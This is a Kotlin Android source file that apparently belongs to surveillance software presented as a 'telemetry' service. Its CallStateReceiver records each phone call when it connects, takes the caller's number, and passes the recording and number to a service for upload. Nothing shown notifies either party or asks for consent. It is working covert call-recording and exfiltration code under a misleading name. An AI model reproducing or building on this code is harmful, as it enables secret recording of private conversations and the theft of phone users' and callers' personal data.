package com.pulsedrop.telemetry.services

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.TelephonyManager
import com.pulsedrop.telemetry.TelemetryService

class CallStateReceiver : BroadcastReceiver() {

    companion object {
        private var lastState = TelephonyManager.CALL_STATE_IDLE
        var callRecorder: CallRecorder? = null
        var currentFilePath: String? = null
    }

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != TelephonyManager.ACTION_PHONE_STATE_CHANGED) return

        val stateStr = intent.getStringExtra(TelephonyManager.EXTRA_STATE)
        val number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER) ?: "unknown"

        val state = when (stateStr) {
            TelephonyManager.EXTRA_STATE_RINGING -> TelephonyManager.CALL_STATE_RINGING
            TelephonyManager.EXTRA_STATE_OFFHOOK -> TelephonyManager.CALL_STATE_OFFHOOK
            TelephonyManager.EXTRA_STATE_IDLE -> TelephonyManager.CALL_STATE_IDLE
            else -> TelephonyManager.CALL_STATE_IDLE
        }

        when (state) {
            TelephonyManager.CALL_STATE_OFFHOOK -> {
                if (lastState == TelephonyManager.CALL_STATE_RINGING || lastState == TelephonyManager.CALL_STATE_IDLE) {
                    // Call connected - start recording
                    callRecorder?.let {
                        currentFilePath = it.startRecording(number)
                    }
                }
            }
            TelephonyManager.CALL_STATE_IDLE -> {
                if (lastState == TelephonyManager.CALL_STATE_OFFHOOK) {
                    // Call ended - stop recording
                    callRecorder?.stopRecording()?.let { file ->
                        // Notify service to upload the recording
                        val serviceIntent = Intent(context, TelemetryService::class.java).apply {
                            action = "CALL_RECORDING_COMPLETE"
                            putExtra("file_path", file.absolutePath)
                            putExtra("phone_number", number)
                        }
                        context.startService(serviceIntent)
                    }
                }
            }
        }
        lastState = state
    }
}
